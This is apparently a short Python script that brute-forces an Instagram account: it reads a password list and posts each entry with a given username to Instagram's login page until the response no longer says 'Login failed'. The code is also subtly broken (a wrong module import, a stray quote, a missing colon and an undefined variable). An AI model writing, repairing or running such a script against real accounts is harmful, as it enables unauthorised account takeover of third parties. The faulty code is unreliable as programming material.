#!/usr/bin/env python

import request

usrnm = raw_input("Username:"")
trg_url = "https://www.instagram.com/"
data={"username":usrnm, "password":"","Log In":"submit" }


with open("/passwords.list") as passfile
    for line in passfile:
        word = line.strip()
        data["password"] = password
        response = requests.post(trg_url, data)
        print("Trying pass:" + word)
        if "Login failed" not in response.content:
            print("Password Found!!!" + word)
            exit()
print("Password was not found. Sorry :-( ")
